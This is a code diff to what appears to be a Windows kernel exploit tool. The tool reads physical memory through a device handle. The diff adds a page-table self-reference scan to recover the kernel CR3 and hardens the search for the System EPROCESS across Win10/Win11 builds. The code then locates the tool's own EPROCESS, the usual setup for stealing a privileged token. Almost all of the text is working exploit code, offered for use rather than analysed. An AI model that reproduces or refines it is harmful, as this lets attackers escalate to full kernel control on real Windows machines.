@@ -216,6 +216,43 @@ static uint64_t find_data_zero(int min)
  * ══════════════════════════════════════════════════════════════════════════ */
 
 static uint64_t g_kcr3 = 0;
+
+/* PML4 self-referencing slot scan — finds kernel CR3 without using EPROCESS.DTB.
+ * Immune to the Win11 26200 false-positive where EPROCESS.DTB = kernel VA. */
+static uint64_t find_kernel_cr3(uint64_t nt_va)
+{
+    uint32_t nt_idx = (uint32_t)((nt_va >> 39) & 0x1FF);
+    /* Pass 0: classic self-ref slot 0x1ED (pre-Win10 1703), first 256MB.
+     * Pass 1: any kernel-half slot 0x100-0x1FF, first 64MB. */
+    for (int pass = 0; pass < 2; pass++) {
+        uint64_t scan_limit = (pass == 0) ? 0x10000000ULL : 0x04000000ULL;
+        for (int r = 0; r < g_nranges; r++) {
+            uint64_t base = (g_ranges[r].base + 0xFFF) & ~0xFFFULL;
+            uint64_t end  = g_ranges[r].base + g_ranges[r].size;
+            if (base >= scan_limit) continue;
+            if (end > scan_limit) end = scan_limit;
+            for (uint64_t pa = base; pa + 0x1000 <= end; pa += 0x1000) {
+                int found_self = 0;
+                if (pass == 0) {
+                    uint64_t e = phys_read64(pa + 0x1ED * 8);
+                    if ((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa) found_self = 1;
+                } else {
+                    for (uint32_t s = 0x100; s <= 0x1FF && !found_self; s++) {
+                        uint64_t e = phys_read64(pa + s * 8);
+                        if ((e & 1) && (e & 0x000FFFFFFFFFF000ULL) == pa) found_self = 1;
+                    }
+                }
+                if (!found_self) continue;
+                /* Reject KPTI shadow tables: ntoskrnl PML4 entry must be present */
+                uint64_t nt_e = phys_read64(pa + nt_idx * 8);
+                if (!(nt_e & 1)) continue;
+                return pa;
+            }
+        }
+    }
+    return 0;
+}
+
 static uint64_t kva_to_pa(uint64_t va)
 {
     if (!g_kcr3) return 0;
@@ -234,15 +271,29 @@ static uint64_t kva_to_pa(uint64_t va)
 
 static uint64_t find_system_pa(void)
 {
+    /* Try multiple ImageFileName offsets to handle Win10/Win11 build variation.
+     * Check PID=4 first (cheap), then name, then validate DTB as physical address. */
+    static const uint32_t name_offsets[] = { 0x5A8, 0x5B8, 0x5B0, 0x5C0 };
     for (int r = 0; r < g_nranges; r++) {
-        uint64_t base = g_ranges[r].base, end = base + g_ranges[r].size;
-        for (uint64_t pa = base; pa + 0x900 < end; pa += 0x10) {
-            char nm[8]; if (!phys_read(pa + 0x5A8, nm, 8)) continue;
-            if (memcmp(nm, "System\0\0", 8)) continue;
-            if (phys_read64(pa + 0x440) != 4) continue;
-            uint64_t dtb = phys_read64(pa + 0x028);
-            if (!dtb || (dtb & 0xFFF)) continue;
-            return pa;
+        uint64_t base = (g_ranges[r].base + 7) & ~7ULL;
+        uint64_t end  = g_ranges[r].base + g_ranges[r].size;
+        for (uint64_t pa = base; pa + 0xA00 < end; pa += 8) {
+            uint32_t pid_val = 0;
+            if (!phys_read(pa + 0x440, &pid_val, 4)) continue;
+            if (pid_val != 4) continue;
+            for (int n = 0; n < 4; n++) {
+                char nm[8];
+                if (!phys_read(pa + name_offsets[n], nm, 8)) continue;
+                if (memcmp(nm, "System\0\0", 8)) continue;
+                uint64_t dtb = phys_read64(pa + 0x028);
+                /* DTB must be physical: page-aligned, > 64KB, and bits 40+ zero
+                 * (kernel VAs have bits 40+ set → catch Win11 26200 false positive) */
+                if (!dtb || (dtb & 0xFFF) || dtb < 0x10000 || (dtb >> 40)) continue;
+                uint64_t flink = phys_read64(pa + 0x448);
+                uint64_t blink = phys_read64(pa + 0x450);
+                if (flink < 0xFFFF800000000000ULL || blink < 0xFFFF800000000000ULL) continue;
+                return pa;
+            }
         }
     }
     return 0;
@@ -405,11 +456,20 @@ int main(void)
 
     load_secs();
 
-    /* Kernel CR3 */
+    /* CR3: prefer PML4 self-ref scan (immune to EPROCESS.DTB false positives) */
+    g_kcr3 = find_kernel_cr3(g_nt_va);
+    if (g_kcr3)
+        printf("[+] Kernel CR3 (PML4 scan): %016"PRIx64"\n", g_kcr3);
+    else
+        printf("[~] PML4 scan failed, will use EPROCESS.DTB\n");
+
     uint64_t sys_pa = find_system_pa();
     if (!sys_pa) { puts("[-] System EPROCESS not found"); close_dev(); return 1; }
-    g_kcr3 = phys_read64(sys_pa + 0x028);
-    printf("[+] Kernel CR3: %016"PRIx64"\n", g_kcr3);
+    if (!g_kcr3) {
+        g_kcr3 = phys_read64(sys_pa + 0x028);
+        printf("[+] Kernel CR3 (EPROCESS.DTB): %016"PRIx64"\n", g_kcr3);
+    }
+    if (!g_kcr3) { puts("[-] No CR3 available"); close_dev(); return 1; }
 
     /* Find own EPROCESS */
     uint64_t own_pa = find_own_eproc_pa(sys_pa);
